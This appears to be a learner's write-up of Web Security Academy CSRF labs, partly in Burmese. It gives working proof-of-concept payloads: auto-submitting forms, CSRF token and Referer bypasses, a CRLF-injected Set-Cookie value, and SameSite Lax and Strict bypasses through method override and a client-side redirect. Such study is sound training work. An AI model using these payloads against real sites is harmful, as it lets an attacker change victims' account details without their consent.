   

                             CLIENT-SITE REQUEST FORGERY(CSRF)
                             =================================


 Lab: CSRF vulnerability with no defenses
 ----------------------------------------
 1. first i login with given user crendential [wiener:peter]
 2. then update my email 
 3. so i realize that i can do CSRF attack from this
 4. so in burpistory, produce a CSRF Poc like this 
  <form action="https://0ac600f1038b57308054125600df00fc.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin@normal-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
5. sent this payload to the victim
6. BOOM! his payload is changed to whatever i want to change when he click it




CSRF where token validation depends on request method
-----------------------------------------------------
1. same as always i login and update my email
2. when i check for csrf with burp , i see it use csrf token with post method
3. when i change to GET method , i doesn't check the CSRF token
4. so i change to GET method and the payload is like this
<form action="https://0ab000cb03cbebec81f30d4700150085.web-security-academy.net/my-account/change-email?" method="GET">
      <input type="hidden" name="email" value="peter@normal-user.net" />
</form>
<script>
      document.forms[0].submit();
</script>
5.BOOM! 



CSRF where token validation depends on token being present
----------------------------------------------------------
1. when i check in the burprepeater , it check the csrf token is TRUE or FALSE not included 
2. so i delete the whole param of csrf and the payload is like this 
 <form action="https://0a4e002a04292b7680dec1b300260035.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="zane@normal-user.net" />
      <input type="submit" value="Submit request" />
</form>
<script>
      document.forms[0].submit();
</script>
3. BOOM




Lab: CSRF where token is not tied to user session
-------------------------------------------------
1. the lab gives me two user crendentials for two accounts
2. i login with first account and in the burp i check if the csrf can bypass
3. nothing works, so i login second account in the private window of firefox
4. and in the intercept , i got csrf and i copy it and use it in the first account's csrf token and it changed to second account
5. so the problem is the account's session is not belong to csrf
csrf token = account success
session token = account success
but csrf not equal session
6. so the payload is 
<form action="https://0a79006d03f55fa28024673900210079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@test." />
      <input type="hidden" name="csrf" value="iV3enTF9aNhfZ1lMDdRAwqqLVlZpmoGK" />
      <input type="submit" value="Submit request" />
</form>
<script>
      document.forms[0].submit();
</script>
7. BOOM!




Lab: CSRF where token is tied to non-session cookie
---------------------------------------------------
1. firstly login with first account, wiener:peter
2. in burp , there is two csrf token, one for session and one for email update
3. so i check each are tied by testing invalid csrf , then yes, they are tied together
4. and check they are from one frame work or different frame work, 
5. login with second account and use it's csrf token for session and csrf token in the first's email update
6. it works 
7. i prepare payload like this 
 [1] to inject our csrf session token in victime's session
 => /search=hello
 setcookie: sAANSGRrh5JFvX4geKsFB7FtjYCg0smW

 [2] send a csrf attack with our csrf token







 CSRF where token is duplicated in cookie
 -----------------------------------------
 1. first i login with my account and update email and check with burp
 2. in the burp repeater, there is two csrf token , one for session and one for csrf param
 3. when i test and i realize that two csrf tokens are tied , the backend check if two csrf token are equal or not
 4. so i go to the search function and check if there's any csrf , there is not csrf token
 5. so i inject fake csrf token like this
 [?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None]
 6. so the target's session csrf token changed to [fake]
 7. so another csrf token must be fake
 8. the payload is like this,
 <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9000dd04798cd78079039600ea00f4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="fake1@normal-user.net" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a9000dd04798cd78079039600ea00f4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
9. BOOM!




difference between site and origin
----------------------------------
site = last part of the domain (example.com)
origin = the whole site(https://www.example.com)

https://www.example.com  || https://www.app.example.com => same site but not same origin

https://www.example.com || https://www.example.com => same site and same origin



Security Implications
---------------------

JavaScript execution vulnerability တစ်ခုရှိရင်၊ attacker က same site အောက်က တခြား domains တွေမှာရှိတဲ့ site-based defenses တွေကို bypass လုပ်နိုင်ပါတယ်။

ဥပမာ: https://app.example.com မှာ vulnerability ရှိရင် https://intranet.example.com ကိုပါ ထိခိုက်နိုင်တယ်။ ဘာလို့လဲဆိုတော့ နှစ်ခုလုံးက same site (example.com) အောက်မှာရှိလို့ပါ။




SameSite Restriction Levels (၃ မျိုး)
1. Strict

    အပြင်းထန်ဆုံး restriction

    Cross-site request ဘယ်တော့မှ cookie မပို့ဘူး

    Same site ကနေ လာတဲ့ request ပဲ cookie ပို့မယ်

2. Lax

    အလယ်အလတ် restriction

    Safe HTTP methods (GET လို) cross-site request တွေမှာ cookie ပို့မယ်

    Unsafe methods (POST လို) cross-site request တွေမှာ cookie မပို့ဘူး

3. None

    Restriction မရှိ

    Cross-site request အားလုံးမှာ cookie ပို့မယ်

    ဒါပေမယ့် Secure attribute လည်း တွဲသတ်မှတ်ဖို့လို (HTTPS only)





Lab: SameSite Lax bypass via method override
--------------------------------------------
1. first i login and change my email and check with burp but it has no any csrf token
2. so i realize that the server used lax method
3. so i go back to login function and sent the request and in the repeater response like this
[Set-Cookie: session=JtSRd7rdGIzJwCsSxVk3ljZfcqy5rlYz; Expires=Fri, 24 Oct 2025 13:35:38 UTC; Secure; HttpOnly]
4. so the browser will use LAX restriction as default
5. lax => cookie sent to top-level navigation and GET request
6. in the email change function , we have to change the method to GET and the payload is like this
[GET /my-account/change-email?email=test%40normal-user.net&_method=POST HTTP/2]
7. so to solve the lab , 
[<script>
document.location="https://0ac7003203d80a0b81fba3ec00dd008b.web-security-academy.net/my-account/change-email?email=hacker%40normal-user.net&_method=POST ";
</script>
]
8.BOOM!





Lab: SameSite Strict bypass via client-side redirect
----------------------------------------------------
1. first i logined and check in burp, when i send request, got
[Set-Cookie: session=wVCUUqxjcoepduJAqz8il7Uz4rOtGNGp; Secure; HttpOnly; SameSite=Strict]
2. so i got the site use strict method
strict => only send cookies to same site request
3. so we have to find a way 
4. when i go to a random post and upload a post, it show me successfully uploaded and then 
suddenly return to the post page back [vulnerability]
5. and in the burp history, there is javascript file , /resources/js/commentConfirmationRedirect.js
6. when i check the code, it use PostId as parameter  to dynamically construct the path for the client-side redirect. 
7. so i check the 0a5b00b604a9f4fb8198480f004b004b.web-security-academy.net/post/comment/confirmation?postId=7 and change the parameter and it works
8. so i found a way to go to the email-change from top-level navigation like this
9. [https://0a5b00b604a9f4fb8198480f004b004b.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account]

10. so my exploit payload is 
[<script>
    document.location = "https://0a5b00b604a9f4fb8198480f004b004b.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>]




Lab: CSRF where Referer validation depends on header being present
------------------------------------------------------------------
1. First i login to my account and change email and check with burp
2. in burp, Referer: https://0a4f00910302d451806f0d15003b0049.web-security-academy.net/my-account?id=wiener
3. so i deleted the whole referer header and test if the request accepted, 
4. the request is accepted
5. so payload is like this
<html>
<head>
  <meta name="referrer" content="never">
</head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a51002f03b921c281182ff100220006.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="victim&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

6. BOOM!






Lab: CSRF with broken Referer validation
----------------------------------------
1. First login to my account and change the email and check with burp 
2. In burp, the site check the expected domain in the referrer header
3. so the payload is like this
<html>
<head>
  <meta name="referrer" content="unsafe-url">
</head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1e003403f258ef81a3392b00d500ff.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;mail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a1e003403f258ef81a3392b00d500ff.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>

4. BOOM!






    